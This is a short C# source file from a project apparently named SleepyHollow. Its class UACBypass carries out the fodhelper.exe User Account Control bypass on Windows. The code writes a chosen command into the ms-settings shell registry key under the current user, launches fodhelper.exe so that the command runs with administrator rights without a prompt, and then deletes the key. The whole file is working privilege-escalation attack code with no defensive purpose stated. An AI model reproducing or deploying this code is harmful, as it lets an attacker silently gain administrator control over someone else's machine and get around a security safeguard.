using System.Diagnostics;

namespace SleepyHollow;

internal static class UACBypass
{
    internal static void RunAsAdministrator(string command)
    {
        if (UserHelper.IsAdmin())
        {
            Process.Start(new ProcessStartInfo() { FileName = command });
            return;
        }

        if (!UserHelper.IsMemberOfAdministrators())
        {
            Console.WriteLine("Cannot bypass UAC - user is not a member of Administrators group");
            return;
        }
        Microsoft
            .Win32.Registry.CurrentUser.CreateSubKey(
                "Software\\Classes\\ms-settings\\shell\\open\\command"
            )
            .SetValue("", command);

        Microsoft
            .Win32.Registry.CurrentUser.CreateSubKey(
                "Software\\Classes\\ms-settings\\shell\\open\\command"
            )
            .SetValue("DelegateExecute", "");
        Process.Start(new ProcessStartInfo() { FileName = "C:\\Windows\\System32\\fodhelper.exe", UseShellExecute = true });
        Microsoft
            .Win32.Registry.CurrentUser.DeleteSubKeyTree(
                "Software\\Classes\\ms-settings\\shell\\open\\command"
            );
    }
}
